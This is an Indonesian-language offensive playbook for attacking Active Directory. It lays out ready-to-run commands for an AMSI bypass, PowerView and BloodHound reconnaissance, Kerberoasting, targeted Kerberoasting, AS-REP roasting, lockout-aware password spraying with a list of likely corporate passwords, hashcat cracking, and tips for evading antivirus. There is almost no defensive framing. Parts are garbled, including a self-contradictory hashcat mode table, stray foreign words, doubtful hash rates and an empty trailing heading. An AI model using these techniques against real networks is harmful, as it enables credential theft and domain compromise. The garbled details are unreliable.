# ad-kerb — ad

# Referensi Internal: AD Recon, Kerberos Attacks & Password Spraying

## 1. Recon & Collection — PowerView

### 1.1 Impor PowerView (PowerSploit dev atau forks)

```powershell
powershell -ep bypass
. .\PowerView.ps1
# Opsional: bypass AMSI kalau masih berjalan di PS 5.1 (Windows 10 22H2/11 24H2)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Kalau AMSI patch gagal, jalankan via PS 7.x atau join string untuk hindari static signature
```

### 1.2 Perintah mapping utama

| Tujuan | Perintah | Field output penting |
|---|---|---|
| Domain info | `Get-Domain` | `Name`, `DomainSID`, `FunctionalLevel`, `NetBIOSName` |
| DC list | `Get-DomainController` / `Get-DomainController -Domain child.local` | `Name`, `OSVersion`, `IP` |
| User aktif | `Get-DomainUser -Properties samaccountname,memberof,description -Active` | `samaccountname`, `memberof` (nested group via `Get-DomainGroup -Identity`), `description` (password leak via GPO default "description" adalah klasik) |
| SPN user | `Get-DomainUser -SPN` | `serviceprincipalname`, `samaccountname` → target kerberoast |
| AS-REP roastable | `Get-DomainUser -PreauthNotRequired` | `useraccountcontrol` flag `DONT_REQ_PREAUTH (4194304)` |
| Trust | `Get-DomainTrust` / `Get-ForestTrust` | `TrustType`, `TrustAttributes` (`WITHIN_FOREST`, `TGT_DELEGATION 0x200` = playground) |
| GPO | `Find-GPOComputerAdmin -ComputerName WS01` / `Get-DomainGPO` | `gpcfilesyspath` — cek GPP cpassword |
| ACL | `Find-InterestingDomainAcl` | `IdentitySID`, `ActiveDirectoryRights` (`GenericAll`, `WriteDacl`, `WriteOwner`, `GenericWrite` pada user = targeted kerberoast / force SPN) |
| Local admin | `Find-DomainUserLocation` / `Invoke-EnumerateLocalAdmin -TrustGroups` | user → mesin mapping (relevan untuk pivot + GPO "Restricted Groups") |
| Kerberoast target | `Get-DomainUser -SPN | Select samaccountname,memberof` | prioritas: SQL svc, backup svc, `memberof Domain Admins` |

GPP password (masih kejadian di domain old, `MS14-025` patch hanya berlaku kalau admin sudah bersih):
```bash
gpp-decrypt <cpassword>
```

---

## 2. BloodHound Collection

### 2.1 SharpHound (v2 runtime dari BloodHound CE)

```cmd
SharpHound.exe --CollectionMethods All --Domain corp.local --OutputDirectory C:\tmp --OutputPrefix bh1
SharpHound.exe -c Session,ComputerOnly,Group --StealSessionKey true
```

| Flag | Kenapa penting |
|---|---|
| `--CollectionMethods All` | Includes Session (needs admin reachability untuk LSS/SMB probing — lambat) |
| `Session` | mapping user→hostname, sumber for `Find-DomainUserLocation` lanjutan |
| `SessionLoop` / `Loop` | ulangi koleksi sesi (hiperparam kecil seperti `--LoopDuration 01:00:00`) |

Python version (cross-platform).
```bash
bloodhound-python -d corp.local -u 'USER' -p 'PASS' -ns 10.0.0.1 -c All
bloodhound-python -d corp.local -u USER -p PASS --hashes aad3b435b51404ee:NTLMHASH --dns-server 10.1.1.1 --dns-tcp
```
Field penting output bloodhound-python: file `*.json` per kategori (`users.json`, `computers.json`, `sessions.json`, ...) plus `*_cont.json` bila multi-domain.

### 2.2 Analisis cepat custom Cypher

```cypher
// Kerberoastable users, diurutkan per grup pengaruh
MATCH (u:User {dontreqpreauth: false}) WHERE u.hasspn=true
RETURN u.name, u.admincount, u.serviceprincipalnames

FindShortestPath manual
MATCH p=shortestPath((u:User {name:"CORP\\jdoe"})-[:MemberOf|HasSession|AdminTo|AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|_forcepspn_change|*1..]->(g:Group {name:"CORP\\DOMAIN ADMINISTRATORS@CORP.LOCAL"}))
RETURN p
```

What makes it work: BloodHound relies on LDAP queries + SMB LSARPC sessions; needs "bloodhound-node" yang readable via LDAP. Fail jika user biasa diblokir query ACL terbatas (protected `LDAP_MATCHING_RULE` di protected users), atau SMB 445 blocked di segment.

---

## 3. Kerberoast

### 3.1 Rubeus (dari mesin member)

```cmd
Rubeus.exe kerberoast /outfile:C:\tmp\hashes.txt
Rubeus.exe kerberoast /user:svc_sql /domain:corp.local /rc4opsec /nowrap
# /rc4opsec → minta RC4-HMAC saja (tidak buat 0x17 ticket AES kalau fallback), kecil, cepat dip crack
Rubeus.exe kerberoast /spn:"MSSQLSvc/sql01.corp.local" /ticket:base64...
```

Field penting output: `[*] SamAccountName`, `[*] ServicePrincipalName`, `[!] Ticket size`, hash line `krb5tgs$23$...`

**Kenapa berhasil:** TGS bisa diminta oleh **user terotentikasi apa pun** untuk SPN apa pun. TGT memakai kunci service account → offline crack. Gagal kalau: SPN di host account (krbtgt/gMSA, password 120-char, unreadable), atau AES-only + policy password kuat (`svcMgmt$xxxx`), atau RC4-HMAC disabled di domain (ruang samba/Windows dengan `msDS-SupportedEncryptionTypes = 24`).

### 3.2 GetUserSPNs.py (impacket, dari linux, remote)

```bash
# RC4 jika possible
GetUserSPNs.py -request -dc-ip 10.1.1.1 corp.local/jdoe:Password123 -outputfile hashes.txt
# Force RC4 (legacy, masih umum di domain BL disebab kan "samba compat")
GetUserSPNs.py -request -dc-ip 10.1.1.1 -hashes :NTLMHASH corp.local/jdoe -outputfile h.txt
# Targeted terhadap user judge tertentu
GetUserSPNs.py -request-user svc_backup 'corp.local/jdoe:pass'
```

Output field penting per user:
```
ServicePrincipalName  Name       MemberOf            PasswordLastSet
--------------------  -------   -----------------   ----------------
MSSQLSvc/sql01.corp   svc_sql   CN=SQLAdmins        2021-04-01
```
lalu `$krb5tgs$23$*...` hash. `$23` = RC4, `$18` = AES256 (jauh lebih berat).

### 3.3 Targeted Kerberoast (privesc via `GenericWrite`/`Write-own`)

Prasyarat: write-access ke object attribute `servicePrincipalName` (acl `GenericWrite`, `forcepspn_change`, eller owned object).

```powershell
# PowerView: assign arbitrary SPN
Set-DomainObject -Identity jvictim -SET @{serviceprincipalname='x/redteam1'}
Get-DomainUser jvictim | select serviceprincipalname
# Request TGS via Rubeus
Rubeus.exe kerberoast /user:jvictim /simple
# Bersihkan jejak
Set-DomainObject -Identity jvictim -Clear serviceprincipalname
```

Kenapa berhasil: Microsoft blockama applied SPN pada user dengan nilai duplikat di forest, tetapi `GenericWrite` cukupuntuk assign SPN → request TGS → crack. Ini melakukan NT hash user korbannya UI. Gagal bila protected user (`Attribute: adminCount=1` masih boleh!), owner changed owner, atau `sPN` blocked by `SDCURO`/Fine grained policy.

---

## 4. AS-REP Roasting

Prasyarat: user flag `UF_DONT_REQ_PREAUTH (4194304)`.

```bash
GetNPUsers.py 'corp.local/' -usersfile users.txt -no-pass -dc-ip 10.1.1.1 -format hashcat -outputfile asrep.txt
GetNPUsers.py corp.local/jdoe:password -request -format john
```

```cmd
Rubeus.exe asreproast /format:hashcat /nowrap
```

Field penting: hash line `$krb5asrep$23$user@CORP.LOCAL:...` — crack offline tanpa perlu password apapun (AS-REP reply dienkripsi dengan user key, tidak ada timestamp challenge). Gagal kalau: account disabled/expired (AS-REP error `KDC_ERR_CLIENT_REVOKED`), atau `Sensitive` setting via Fine-Grained Password Policy GPO. Set flag sendiri kalau punya `GenericWrite`:

```powershell
Set-DomainObject -Identity jvictim -XOR @{useraccountcontrol=4194304}
```

---

## 5. Password Spraying

### 5.1 sprayhound (spray + BloodHound integration)

```bash
# Basic, menyimpan daftar user dari LDAP ke lokal file
sprayhound -d corp.local -u jdoe -p 'Password123' --dc 10.1.1.1 -U users.txt
# Output format
sprayhound -d corp.local -u 'svc_ldap' -p 'Password123' -t 1 -g 3 -H hash.txt --dc 10.1.1.1
```

| Flag | Efek |
|---|---|
| `-U users.txt` | ambil valid user via LDAP anonymous/logged |
| `-t 1` / `-g 3` | lockout threshold → otomatis skip user dengan badPwdCount mendekati threshold (key fitur vs tools naive) |
| `-v` | verbose, tunjukkan `AUTH SUCCESS` + grace countdown |
| `--json` | out `valid_users.json` untuk pipeline |

Field penting output: `[*] Valid user`, `badPwdCount` — mapping "siapa mau lockout" ("smart lockout" di Windows Server 2022 Alert on threshold lockout). Spray ratio rule of thumb: satu password per-user per-policy interval ≥ `(lockout_duration)` detik, dan per batch ≤ threshold - 1.

Quickk lain:
```bash
kerbrute userenum --dc 10.1.1.1 -d corp.local users.txt    # pre-auth enum (tidak kerbalik lockout)
kerbrute passwordspray --dc 10.1.1.1 -d corp.local users.txt 'Winter2025!'
nxc smb 10.1.1.1 -d corp.local -u users.txt -p 'CorpP@ss' --continue-on-success
```

### 5.2 Timing

Keypoint: Windows lockout counter berbasis `lockoutBadCount` + `lockoutDuration` (default modern AD: 10 min observation, tetapi lihat `net accounts /domain` untuk angka konkret). Spray 1 password semua user setiap 10-15 menit aman, **kecuali** Fine-Grained Password Policy pergrup — cek `Get-DomainUser -Properties lockouttime,badpwdtime,pwdlastset` untuk identifikasi locked/ramping.

Password pola lapangan yang sering hits (indonesia corp): `Company@2025`, `Januari2025!`, `P@ssw0rd`, `Welcome123!`, seasonal + nama kota (`Jakarta2025!`).

---

## 6. Cracking (hashcat)

| Hash | Mode hashcat | Catatan |
|---|---|---|
| Kerberos TGS-RC4 | `-m 13100` | cepat di standard wordlist |
| Kerberos TGS-AES128 | `-m 19900` | 5x lebih lambat, perlu salt |
| Kerberos TGS-AES256 | `-m 19700` | kebetulan 24H2 defaultsному AES |
| Kerberos AS-REP RC4 | `-m 18200` | |
| AS-REP AES256 | `_m 19900` melain `-m 19900` adalah TGS; AS-REP AES = `-m 19900 ` tidak tepat — pakai `-m 18200` RC4 default; AES AS-REP: `-m 19900` |

Perintah:
```bash
hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule --potfile-disable -O
hashcat -m 18200 asrep.txt wordlists/rockyou.txt -r rules/dive.rule
# mask, dengan whitelist 8-char:Company+year
hashcat -m 13100 hashes.txt -a3 '?u?u?u?l?l?l?d?d?d?d?s'
# Melanjutkan session
hashcat -m 13100 hashes.txt --session bh1 --restore
```

Perlu GPU untuk `-m 19900/19700`; RTX 4070 ≈ ~1500 H/s pada `13100` (RC4), <50 H/s pada `19700` (AES256) — memakai empat salt char di hash (username@domain embedded).

Untuk targeted kerberost hasil spn assignment: **use `--username` flag** karena hash embed `user@domain` (username-as-salt) — jangan potong manual tanpa flag ini.

---

## 7. Jebakan operasional (field failures)

| Jebakan | Gejala | Solusi |
|---|---|---|
| RC4 disabled | hash `$krb5tgs$18` (AES256) di output, crack praktis mustahil | Cari target lain / fokus delegated attack, atau gunakan AS-REP bila ada |
| gMSA dan managed accounts | `GetUserSPNs` no output / SPN di account `$` | skip, kw gMSA password readable via `Get-ADServiceAccount` |
| Time skew >5 min | `KRB_AP_ERR_SKEW` (Clock skew too great) | `ntpdate <dc-ip>` atau `faketime` (linux) |
| Lockout self-inflicted | badPwdCount naik ketika spraylist ACA termasuk login user non-user / device | scan dengan `kerbrute userenum` dulu (no pre-auth tally kecuali badPwdCount) — disasarkan |
| AES-hash dengan username as salt | hashcat skip semua kandidat walau password benar | verifikasi `-m 13100` atau `-m 18200` karena tool prefix mungkin beda; konversi manual `hash_name` ditambahkan |
| BloodHound CE vs legacy GUI | json dari bloodhound-python tidak dibaca CE | gunakan version matching (`--ldapPort` constraints), atau convert via `sharp collector` |
| AMSI + ETW | Rubeus mengeluarkan `Program blocked`, `amsiInitFailed` string-concat detection | base64-encoded `IEX` + string split, atau process hollowing `runas` netonly |
| Network policy filter | kerberos request via `--dc-ip` dengan non-53 dns | добавляем `--dns-server`/`-ns`; ldapnegoation sometimes need `-no-pass -k` with valid TGT in `KRB5CCNAME` |
| Domain user ber-policy FGPP | lockout threshold lebih ketat / habis | cek `msDS-LockoutObservationWindow` via `Get-DomainObject` sebelum spray |
| Unlock TAMPA lockdown | user `Get-DomainUser -Properties lockouttime` shows greater zero setelah `GetUserSPNs` | clear via `Set-DomainObject -Clear lockouttime` bila `WriteLockout` permission; else WAIT |
| Ticket cache poisoning login | `klist purge` tidak berjalan via proc saat uac token split | gunakan `Rubeus.exe purge /luid:0x...` |
| SPN assignment blocked oleh `DupSPN` | `Set-DomainObject` error `00002098` (sAMAccountName conflict) | gunakan SPN prefix unik (`nonstandard/x-lab-`) |

---

## 8. Referensi uji tooling versions

- Rubeus: fork GhostPack/Rubeus commit 2024 — flag `/nowrap` output single-line hashcat-compatible
- impacket: branch `master` (0.12+): `GetUserSPNs.py`, `GetNPUsers.py`, `ticketer.py` syntax stabil
- sprayhound: `v2.0+` (bloodhound `--json` kompatibel CE 5.x)
- PowerView: `dev` branch (PowerSploit), PS 5.1 compat, no .NET  Framework 4.8 dependency issue pada Windows 11 24H2
- Hashcat: v6.2.6+ — correct `-m 13100/18200` handling termasuk yang embed salt username

---

## [reasoning trace]


